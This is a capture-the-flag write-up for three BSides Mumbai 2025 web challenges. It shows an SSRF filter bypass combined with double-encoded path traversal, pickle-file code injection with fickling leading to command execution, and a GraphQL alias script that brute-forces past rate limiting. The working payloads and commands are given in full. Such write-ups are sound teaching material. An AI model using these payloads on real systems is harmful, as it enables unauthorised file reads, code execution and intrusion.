------------------

### CTF-: BSIDESCTF MUMBAI 2025

------------------

![image](https://github.com/user-attachments/assets/a4b42a64-1f70-4091-b3ae-4aa84d952a30)


--------------------

### Challenges

--------------------

- Web-:
  - Phantom-Binding
  - Worthless
  - Operation Overflow

---------------------

### [Web]Phantom Binding

----------------------

![image](https://github.com/user-attachments/assets/a965b09f-e7d8-4b06-8b86-42ae916c4476)

-----------------------

- Ffuf's output-:

![image](https://github.com/user-attachments/assets/9d6a9321-1805-47cf-ab05-6569fdf954ee)


- Users get greeted with the login and register page.I followed the normal sequence by creating an account and logging in.

![image](https://github.com/user-attachments/assets/8d53fcbe-0e53-4760-8c75-adf5fcffe96e)

- I noticed a functionality that allows us to upload image through files or url.This can be an interesting point to try out ServerSide Request Forgery.

![image](https://github.com/user-attachments/assets/1fe12180-6655-43b8-a4a3-da665ef2804a)

- I tried to scan for internal ports with host `localhost` but I noticed that internal hosts get filtered.

![image](https://github.com/user-attachments/assets/7b5d308f-119e-464d-b5a4-c95819f5455e)

- I decided to try this url trick that involves `@`.If 2 hosts are separated with `@`, any host placed after `@` will get loaded and not the host before it.For example-:

```
google.com@127.0.0.1
```

- The `127.0.0.1` will get picked over `google.com`.In my case, I used an ngrok host but you can use any host that doesn't get blacklisted.

![image](https://github.com/user-attachments/assets/7bcc45d7-acb9-4df8-ab94-8e91fc0e4d3d)

- The output gets rendered as an image as seen below.

```html


<!DOCTYPE html>
<html>
<head>
    <title>CTF Challenge</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
        }
        .user-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .user-table th, .user-table td {
            padding: 8px;
            border: 1px solid #ddd;
            text-align: left;
        }
        .user-table th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <div class="container">
        
    <h1>Login</h1>
    
    <form method="post">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
    <p>Don't have an account? <a href="/register">Register here</a></p>

    </div>
</body>
</html>
```
- SSRF can also be used as 403 bypass.At first, I tried to load the `/admin` page but I got the `403` error status `forbiddem`.Since we have ssrf, we can force the server to make a request to the endpoint.

![image](https://github.com/user-attachments/assets/757aab82-a7ec-445e-ade7-bf02f343a462)

- I accessed the admin page and noticed an endpoint that allows us to view files.It should be noted that the site saves the response in `jpg` so I have to load and show the output in a text editor.

![image](https://github.com/user-attachments/assets/f9a7d216-fe71-4043-b1ab-1846a008312a)

- This functionality will be a good spot to test for path traversal and gain `Arbitrary file read` because it is used to read files.I tried the basic `../../` but I got a 403 error.

![image](https://github.com/user-attachments/assets/43d48383-dfe2-4dfd-a058-e1de48655628)

- I tested the double-url encoding trick for `../` which worked.I was able to read the `/etc/passwd `file.

![image](https://github.com/user-attachments/assets/d9898361-24b0-4560-89cd-69e378a3413c)

- After checking the common spots for the flag file.I could not find the file.I rechecked the admin page for hints and I got one.A php file points to the flag which is being stored at `/var/flag/flag.txt`.

![image](https://github.com/user-attachments/assets/cf2e2e16-f67c-45dc-84f5-c0a58ad43c3d)

![image](https://github.com/user-attachments/assets/14f943ee-7bea-4765-a7a1-2e82ee0382a4)

- I read the flag with this payload-:

```url
http://6.tcp.eu.ngrok.io:16967@127.0.0.1/admin/view_file?file=%252E%252E%252F%252E%252E%252Fvar%252Fflag%252Fflag.txt
```

![image](https://github.com/user-attachments/assets/f350904e-2542-483a-a1cd-3e2a62828feb)

- Flag-: ```BMCTF{LOCALHOST_isnt_ALWAYS_local}```

![image](https://github.com/user-attachments/assets/ed515136-f3a7-4b78-be08-cd59b97700af)

-----------------

### [Web]Worthless

-----------------

![image](https://github.com/user-attachments/assets/6b7c4656-ca80-4896-a5ef-30ecc03eb0ea)

-----------------

- The chain in this challenge is `Insecure Deserialization via pkl files upload to RCE`.It is not news that `pickle.loads()` is a vulnerable function.Also the upload of pkl files which is used to store pickle bytes can be exploited if directly passed to `pickle.loads()`.This site allows upload of pickle `pkl` files.

![image](https://github.com/user-attachments/assets/0231794f-c2cc-4e43-8920-e391610dc116)

- I injected malicious code into the pkl file with `fickling`.You can install with `pip instal fickling`.

![image](https://github.com/user-attachments/assets/4ac08420-ef37-4539-9889-a169c18c3ffa)

- Syntax to run it-:

```bash
fickling --inject "int(__import__('os').popen('ls').read())" portfolio.pkl > ./portfolioz.pkl
```

- I tried to pop a reverse shell but it didn't work and was also unsure if I had gained RCE.After futile efforts, I noticed that the site returns errors mainly due to bad code syntax.

![image](https://github.com/user-attachments/assets/0870b4fa-5363-4134-bd54-8f10697f0fa6)

- This is an awesome discovery because I can use the error to read the output of `os.system()`.I did this by abusing `int()` feature which is used for integers in python.`int()` triggers an error and also expose a value in the error if it is a string.Example-:

![image](https://github.com/user-attachments/assets/34e21c2d-a928-46d9-a2af-023548153dae)

- I used it to read the value of the command `ls` that I executed.

![image](https://github.com/user-attachments/assets/719c1491-79e4-40c0-af4d-f05a4ec00d5a)

![image](https://github.com/user-attachments/assets/8f026c1b-023f-43fc-b192-4e462f4978be)

- Final payload-:

```
fickling --inject "int(__import__('os').popen('cat flag.txt').read())" portfolio.pkl > ./portfolioz.pkl
```
- Flag-: ```BMCTF{pretty_lil_baby_you_say_that_maybe_youll_be_thinking_of_me_and_try_to_H4CK_me}```

![image](https://github.com/user-attachments/assets/41b2a1f2-63bb-4a91-8992-48ffd503ef47)


------------------

### Operation Overflow

------------------

- The challenge requires guessing  the correct number between (1-100000).

![image](https://github.com/user-attachments/assets/feea68ae-be24-4d6f-a860-bea77a1c54a2)

- The easier method would have been bruteforcing but we might hit a rate limiting error.I checked the js file and discovered that it runs on graphql.

```js
// GraphQL query
            const query = `
                query {
                    guessNumber(number: ${number}) {
                        correct
                        message
                        flag
                    }
                }
            `;
            
            fetch('/graphql', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ query }),
            })
```

- We can bypass rate limiting in graphql by using aliases.A `Query` is made to the server to get data.You can view it as either a `POST` or `GET` request to grab data.An `Alias` allows you to create multiple queries in a single request e.g if you are trying to bruteforce, you can send in multiple values in a single request e.g

-> Query -:

 ```graphql
query {
     guessNumber(number: 10) {
         correct
         message
         flag
      }
   }
```

-> Alias should have different name values,you'll notice that the first name is `first2` and the other is `first1` -:

```graphql
query {
   first1: guessNumber(number: 10) {
     correct
     message
     flag
   }
   first12: guessNumber(number: 11) {
     correct
     message
     flag
   }
}
```

- After testing it, I noticed that the server can handle only `5000` aliases per request.I tried `10000` aliases at first and 502 gateway error.I wrote a script to make it easier because I can't manually create 5000 aliases.

```python3
#! /usr/bin/env python3
import requests
import asyncio

pre_data = "query {\n  me: guessNumber(number: 100000) {\n    correct\n    message\n    flag\n  }"
end_data = "}\n\n"

async def createData(min: int,max: int) -> str:
    main_data = "" + pre_data
    for i in range(min-1,max):
        data = "\nmezz: guessNumber(number: zz) {\n    correct\n    message\n    flag\n  }\n".replace("zz",str(i))
        main_data += data 
    return main_data + end_data

async def main():
    for i in range(0,100000,5000):
        data = {"query":await createData(i,i+5000)}
        url = "https://abfb9883.bsidesmumbai.in/graphql"
        data = requests.post(url,json=data)
        if "BMCTF" in data.text:
            print(f"[+] Range-:{i}:{i+5000}")
            print("[+] Flag-: BMCTF{"+data.text.split("BMCTF{")[1].split("\"")[0])
            exit()
        else:
            print(f"[-] Not in range-:{i}:{i+5000}")

if __name__ == "__main__":
    asyncio.run(main())
```

- Flag-: ```BMCTF{4l14s_br34k_l1m1ts}```

![image](https://github.com/user-attachments/assets/eb9ff88c-11f0-4e79-b6bd-3ae79fe1ef1b)

-----------------

### Reference

-----------------

- [Backdooring Pkl files](https://embracethered.com/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/)

---------------













